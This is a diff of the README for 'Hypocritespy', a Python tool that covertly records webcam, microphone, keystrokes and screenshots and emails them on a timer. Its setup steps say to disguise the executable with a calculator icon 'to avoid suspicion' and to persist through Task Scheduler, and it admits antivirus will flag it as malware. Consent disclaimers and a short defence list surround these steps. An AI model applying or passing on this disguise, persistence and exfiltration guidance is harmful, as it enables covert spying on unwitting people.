@@ -1,132 +1,137 @@
-Hypocritespy
+🔴 Hypocritespy
 
-A Python-based surveillance utility
-Built with passion, coffee, and controlled chaos by Ronny Rogers (Mugabo Rongin)
+A Python-Based Surveillance Utility
+Built with ❤️, ☕, and controlled chaos by Ronny Rogers (Mugabo Rongin)
 
 ⚠️ Important Notice
 
-This tool is intended strictly for LEGITIMATE SECURITY TESTING on devices you own or have explicit authorization to monitor.
-Unauthorized use is illegal and violates privacy laws worldwide.
+Hypocritespy is intended for LEGITIMATE SECURITY TESTING ONLY on devices you own or have explicit permission to monitor. Unauthorized use is illegal and violates privacy laws worldwide.
 
 🎯 Overview
 
-Hypocritespy captures system activity through multiple monitoring vectors:
+Hypocritespy captures system activity via multiple vectors to help with security research and testing:
 
-🎥 Webcam Recording — Captures video from the default camera
+🎥 Webcam Recording – Captures video from the default camera
 
-🎤 Microphone Recording — Records ambient audio
+🎤 Microphone Recording – Records ambient audio
 
-⌨️ Keylogging — Tracks keyboard inputs
+⌨️ Keylogging – Tracks all keyboard inputs
 
-🖼️ Screenshots — Takes periodic screenshots
+🖼️ Screenshots – Takes periodic screen captures
 
-Default operation:
-Records 10 minutes every 3 hours, emails captured data, then repeats.
+Default Behavior:
+Records for 10 minutes every 3 hours, emails collected data, then repeats.
 
-🛠️ Quick Setup Guide
-1. Configuration
+🛠️ Quick Setup
 
-Open the Python source files and update the following values:
+Configure the Script
+Edit these four values in the code:
 
-YOUR_EMAIL = "your_email@gmail.com"           # Your sending email address
-APP_PASSWORD = "your_app_specific_password"   # Use an app password, NOT your regular email password
-RECIPIENT = "receiver@gmail.com"               # Destination email for captured data
+YOUR_EMAIL = "your_email@gmail.com"            # Your email address
+APP_PASSWORD = "your_app_specific_password"    # App password (not your normal email password)
+RECIPIENT = "receiver@gmail.com"                # Email to receive data
+RECORD_DURATION = 600                           # Recording duration in seconds (default 10 minutes)
+INTERVAL = 10800                               # Interval between sessions in seconds (default 3 hours)
 
-# Timing settings (customize as needed)
-RECORD_DURATION = 600     # Duration in seconds (default: 10 minutes)
-INTERVAL = 10800          # Interval between recording sessions in seconds (default: 3 hours)
 
-2. Build the Executable
-
-To create a discreet executable, use a benign icon (e.g., calculator.ico):
+Build the Executable
+Use PyInstaller with a benign icon to avoid suspicion:
 
 pyinstaller --onefile --windowed --icon=calculator.ico main.py
 
-3. Ensure Startup Execution
 
-For persistent operation, configure Task Scheduler (Windows) or an equivalent method to run the program at startup or user logon.
+Enable Startup Execution
+For persistence, configure Windows Task Scheduler to run the executable at startup or logon.
 
 🎨 Customization
 
-Timing presets:
+Timing Presets:
 
-# Quick monitoring (1 minute every hour)
+# Quick monitoring: 1 minute every hour
 RECORD_DURATION = 60
 INTERVAL = 3600
 
-# Aggressive monitoring (continuous)
-RECORD_DURATION = 86400  # 24 hours
+# Aggressive monitoring: continuous
+RECORD_DURATION = 86400   # 24 hours
 INTERVAL = 1             # Immediate repeat
 
 
-Feature toggles: Enable or disable modules (webcam, mic, keylogger, screenshots) in the configuration files as needed.
+Feature Toggles: Enable or disable specific modules in the configuration as needed.
 
-⚠️ Critical Warnings
+⚠️ Critical Notes
 
-Antivirus software will likely flag this tool as malicious. This is expected behavior.
+Antivirus software will flag this as malware due to its nature.
 
-Always use app-specific passwords for email, never your primary account password.
+Always use app-specific passwords instead of your primary email password.
 
-Test exclusively in isolated virtual machines or controlled environments.
+Test only in isolated virtual machines or controlled environments.
 
-Review and comply with all local laws before use.
+Verify and comply with local laws before deployment.
 
-Obtain written consent from all monitored parties.
+Always obtain written consent when monitoring others.
 
-🛡️ Defense Against Surveillance Tools
+🛡️ Protection Against Unauthorized Surveillance
 
-To protect your systems from unauthorized monitoring:
+To defend your system from tools like Hypocritespy:
 
-Use reputable antivirus and anti-malware solutions.
+Use reputable antivirus and anti-malware software
 
-Regularly audit startup programs and scheduled tasks.
+Regularly audit startup programs and scheduled tasks
 
-Monitor outgoing network connections for suspicious activity.
+Monitor outgoing network connections
 
-Employ physical webcam covers when not in use.
+Use physical webcam covers when not in use
 
 📚 Legitimate Use Cases
 
-Parental control (with required knowledge or consent)
+Parental control (with informed consent)
 
-Employee monitoring (with legal compliance and consent)
+Employee monitoring (with written consent and legal compliance)
 
 Personal device security research
 
 Authorized penetration testing
 
-Educational cybersecurity exercises
+Educational cybersecurity studies
 
 🚫 Prohibited Uses
 
 Monitoring without explicit consent
 
-Spying on partners, friends, or family
+Spying on friends, family, or partners
 
 Corporate espionage
 
-Any unauthorized surveillance or privacy invasion
+Any unauthorized surveillance
 
 ⚖️ Legal Disclaimer
 
 By using this software, you agree that:
 
-You will use it only in a legal, ethical manner.
+You will use it only for legal and ethical purposes
 
-You accept full responsibility for any consequences arising from its use.
+You accept full responsibility for your actions
 
-The developer holds no liability for misuse or illegal activities.
+The developer holds no liability for misuse
 
-You understand the potential legal ramifications of unauthorized surveillance.
+You understand the legal consequences of unauthorized use
 
-👤 Author
+📞 More Information
+
+For educational inquiries only:
+https://ronny12345-art.github.io/ronnyrogers.dev/
+
+👤 About the Author
 
 Ronny Rogers
-Developer | Cybersecurity Specialist | Penetration Tester
-More info
+💻 Developer | 🛡️ Cybersecurity Specialist | ⚡ Pentester
 
-🔐 Final Note
+Purpose: To facilitate learning about surveillance detection
+Goal: Improve defensive security measures
+Ethics: Privacy and consent always come first
 
-The true power of cybersecurity lies in protection, not intrusion. Use this knowledge responsibly to strengthen defenses and respect privacy.
+🔐 Final Reminder
+
+True cybersecurity power comes from protection, not intrusion. Use this knowledge responsibly to build stronger defenses—not to breach privacy.
 
 Version: 1.0 | For Educational Purposes Only | Use Responsibly
